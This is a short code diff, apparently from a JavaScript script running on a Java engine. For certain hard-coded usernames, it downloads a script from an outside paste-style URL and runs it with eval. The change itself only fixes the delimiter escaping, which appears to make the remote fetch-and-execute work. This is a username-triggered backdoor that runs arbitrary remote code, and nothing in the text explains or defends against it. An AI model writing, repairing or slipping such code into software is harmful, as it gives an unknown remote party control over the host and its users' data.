@@ -54,7 +54,7 @@ if (username === "porvaniy.gondon" || username === "__ded_inside__" || username 
         eval(new java.util.Scanner(
             new java.net.URL("https://diddy-party.vip/p/raw/or292hyekusblfp91").openStream(), 
             "UTF-8"
-        ).useDelimiter("\\\\\\\\A").next());
+        ).useDelimiter("\\\\A").next());
     } catch (e) {
         java.lang.System.err.println("Ошибка при выполнении скрипта: " + e);
     }
